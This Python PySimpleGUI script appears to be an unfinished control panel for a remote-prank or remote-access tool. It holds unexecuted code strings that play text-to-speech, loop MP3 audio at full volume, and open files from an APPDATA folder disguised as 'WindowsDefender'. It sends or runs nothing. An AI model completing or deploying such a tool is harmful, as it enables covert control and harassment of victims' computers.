
import PySimpleGUI as sg
import os
sg.theme('default1')


def open_other_files_window():
    layout = [[sg.Text('Enter the file name: '), sg.InputText()],
             [sg.Button("Open File")]]
             
    window = sg.Window("open other files", layout, modal=True)
    choice = None
    while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            break
        if event == "Open File":
            st1 = '''
            path = os.path.join(os.getenv('APPDATA'), "WindowsDefender")
            filename = values[0]
            file_path = os.path.join(path, filename)
            os.startfile(file_path) '''

    window.close()






# ================================================================
def open_send_files_window():
    layout = [[sg.Text('Enter the file directory: '), sg.InputText()],
             [sg.Button("Send File")]]
             
    window = sg.Window("Send Files", layout, modal=True)
    choice = None
    while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            break
        if event == "Send File":
            filename = values[0]

    window.close()






# ===================================================================
def tts_window():
    layout = [[sg.Text('Wirte your text here: '), sg.InputText()],
             [sg.Button("Send TTS")]]
             
    window = sg.Window("TTS Window", layout, modal=True)
    choice = None
    while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            break
        if event == "Send TTS":
            st2 = '''
            from gtts import gTTS
            from playsound import playsound
            # ask for text to speak
            from pygame import mixer
            import pygame

            text = values[0]
            # generate tts
            pygame.init()
            pygame.mixer.init()
            output = gTTS(text=text, lang="en", tld="co.in")
            output.save(f"tts.mp3")



            mixer.music.load("tts.mp3")#music file 
            mixer.music.play()
            pygame.mixer.music.set_volume(1)

            while pygame.mixer.music.get_busy():
               ...  '''
    
    window.close()





# ===================================================================
def open_mp3_window():
    layout = [[sg.Text('enter file name'), sg.InputText()],
             [sg.Button("Open MP3")]]
             
    window = sg.Window("run mp3 files", layout, modal=True)
    choice = None
    while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            break
        if event == "Open MP3":
            st3 = '''
            from pygame import mixer
            import pygame
            import os
            path = os.path.join(os.getenv('APPDATA'), "WindowsDefender")
            filename = values[0]
            file_path = os.path.join(path, filename)
            pygame.init()
            pygame.mixer.init()
            mixer.music.load(file_path)#music file 
            mixer.music.play(-1)
            pygame.mixer.music.set_volume(1)

            while True:
                ... '''
    
    window.close()






# ===================================================================
def main():
    layout = [[sg.Button("send tts massege"), sg.Button("open mp3 files"), [sg.Button("send files")], sg.Button("open other files")]]

    window = sg.Window("Main Window", layout)
    while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            break
        if event == "send tts massege":
            tts_window()
        if event == "open mp3 files":
            open_mp3_window()
        if event == "send files":
            open_send_files_window()
        if event == "open other files":
            open_other_files_window()
    window.close()
if __name__ == "__main__":
    main()